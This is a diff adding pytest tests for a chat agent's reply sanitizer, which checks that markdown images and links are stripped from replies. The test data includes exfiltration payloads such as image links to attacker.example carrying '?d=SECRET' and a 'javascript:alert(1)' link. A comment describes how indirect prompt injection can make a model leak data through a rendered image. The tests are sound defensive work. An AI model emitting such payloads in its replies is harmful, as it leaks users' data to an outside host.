@@ -1,13 +1,13 @@
 import asyncio
 
 import pytest
-from pydantic_ai.messages import ModelResponse, ToolCallPart
+from pydantic_ai.messages import ModelResponse, TextPart, ToolCallPart
 from pydantic_ai.models.function import FunctionModel
 from pydantic_ai.models.test import TestModel
 from sqlalchemy import create_engine
 
 from rolchat.agent import agent
-from rolchat.chat import REFUSAL, answer, decision_panel
+from rolchat.chat import REFUSAL, answer, decision_panel, sanitize
 from rolchat.models import reader_url
 from rolchat.policy import allowed_tools
 
@@ -87,3 +87,26 @@ def test_worker_turn_connects_as_the_level_1_reader(engine, seeded):
     assert engines[2].pool.checkedin() == engines[3].pool.checkedin() == 0
     for e in engines.values():
         e.dispose()
+
+
+@pytest.mark.parametrize("raw, clean", [
+    ("Vardiya 08:00'de. ![x](https://attacker.example/?d=SECRET)", "Vardiya 08:00'de. "),
+    ("![a [b]](https://attacker.example/x.png)son", "son"),
+    ("![x][1]\n[1]: https://attacker.example/?d=SECRET", "\n"),
+    ("Bkz. [duyuru](https://attacker.example/?d=SECRET).", "Bkz. duyuru."),
+    ("[tıkla](javascript:alert(1))", "tıkla"),
+    ("**Montaj** ekibi: 08:00-16:00\n- Ali [1. vardiya]", "**Montaj** ekibi: 08:00-16:00\n- Ali [1. vardiya]"),
+])
+def test_sanitize_drops_images_and_external_links_but_keeps_text(raw, clean):
+    # Indirect prompt injection could make the model add an image that leaks data when the browser loads it.
+    assert sanitize(raw) == clean
+
+
+def test_every_reply_is_sanitized(level_engines, seeded):
+    def injected(messages, info):
+        return ModelResponse(parts=[TextPart("Duyuru yok. ![x](https://attacker.example/?d=SECRET)")])
+
+    with agent.override(model=FunctionModel(injected)):
+        reply = asyncio.run(answer("duyuru?", "isci", [], level_engines, guard=guard_passes))
+
+    assert reply.text == "Duyuru yok. "
